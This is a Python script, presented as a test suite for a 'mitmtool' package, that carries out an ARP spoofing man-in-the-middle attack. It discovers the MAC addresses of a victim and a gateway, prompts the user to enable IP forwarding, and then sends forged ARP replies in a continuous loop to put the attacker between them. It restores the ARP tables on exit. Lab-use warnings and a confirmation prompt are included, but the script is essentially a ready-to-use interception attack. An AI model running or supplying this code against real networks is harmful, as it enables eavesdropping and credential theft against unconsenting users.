#!/usr/bin/env python3
"""
Test script for ARP spoofing functionality
WARNING: Only run in controlled lab environment with permission!
"""

import sys
import time
from mitmtool.arp import get_mac, spoof

def test_arp_spoofing():
    """
    Test ARP spoofing between a target and gateway
    """
    # CONFIGURATION - CHANGE THESE TO YOUR NETWORK
    target_ip = "10.0.0.40"    # Victim device IP (found in arp -a)
    gateway_ip = "10.0.0.1"    # Router/Gateway IP
    
    print("[*] ARP Spoofing Test")
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Gateway IP: {gateway_ip}")
    print()
    
    # Step 1: Get MAC addresses
    print("[*] Step 1: Discovering MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac:
        print(f"[-] ERROR: Could not find MAC for target {target_ip}")
        print("[!] Make sure the IP is correct and device is online")
        return
    
    if not gateway_mac:
        print(f"[-] ERROR: Could not find MAC for gateway {gateway_ip}")
        print("[!] Make sure the gateway IP is correct")
        return
    
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print()
    
    # Step 2: Enable IP forwarding (so traffic actually flows through)
    print("[*] Step 2: Reminder - Enable IP forwarding!")
    print("[!] Windows: Run in Admin PowerShell:")
    print("    Set-NetIPInterface -Forwarding Enabled")
    print("[!] Linux: echo 1 > /proc/sys/net/ipv4/ip_forward")
    print()
    
    # Step 3: Start ARP spoofing
    print("[*] Step 3: Starting ARP spoofing attack...")
    print("[*] Press Ctrl+C to stop")
    print()
    
    sent_packets = 0
    try:
        while True:
            # Tell target: "I am the gateway" (gateway_ip is at attacker's MAC)
            spoof(target_ip, gateway_ip, target_mac)
            
            # Tell gateway: "I am the target" (target_ip is at attacker's MAC)
            spoof(gateway_ip, target_ip, gateway_mac)
            
            sent_packets += 2
            print(f"\r[+] Packets sent: {sent_packets}", end="")
            sys.stdout.flush()
            
            time.sleep(2)  # Send ARP packets every 2 seconds
            
    except KeyboardInterrupt:
        print("\n\n[*] Stopping ARP spoofing...")
        print("[*] Restoring ARP tables...")
        
        # Restore the original ARP tables (send correct MAC addresses)
        for _ in range(5):
            # Send correct ARP info back
            spoof(target_ip, gateway_ip, gateway_mac)  # Tell target: gateway is at gateway's MAC
            spoof(gateway_ip, target_ip, target_mac)    # Tell gateway: target is at target's MAC
            time.sleep(0.5)
        
        print("[+] ARP tables restored")
        print("[+] Attack stopped safely")

def test_mac_discovery():
    """
    Simple test to discover MAC addresses on your network
    """
    print("[*] MAC Address Discovery Test")
    print()
    
    # CHANGE THIS to your network range
    test_ips = [
        "10.0.0.1",      # Your router
        "10.0.0.97",     # Device found on network
    ]
    
    print("[*] Scanning for devices...")
    print()
    
    for ip in test_ips:
        mac = get_mac(ip)
        if mac:
            print(f"[+] {ip} → {mac}")
        else:
            print(f"[-] {ip} → No response")
    
    print()
    print("[*] Test complete")

if __name__ == "__main__":
    print("=" * 60)
    print("ARP Spoofing Test Suite")
    print("=" * 60)
    print()
    print("WARNING: Only use on networks you own or have permission to test!")
    print()
    print("Choose a test:")
    print("1. MAC Address Discovery (safe)")
    print("2. Full ARP Spoofing Test (requires admin/root)")
    print()
    
    choice = input("Enter choice (1 or 2): ").strip()
    
    if choice == "1":
        test_mac_discovery()
    elif choice == "2":
        confirm = input("\nAre you on a controlled test network? (yes/no): ").strip().lower()
        if confirm == "yes":
            test_arp_spoofing()
        else:
            print("[!] Test cancelled. Only run on authorized networks!")
    else:
        print("[-] Invalid choice")
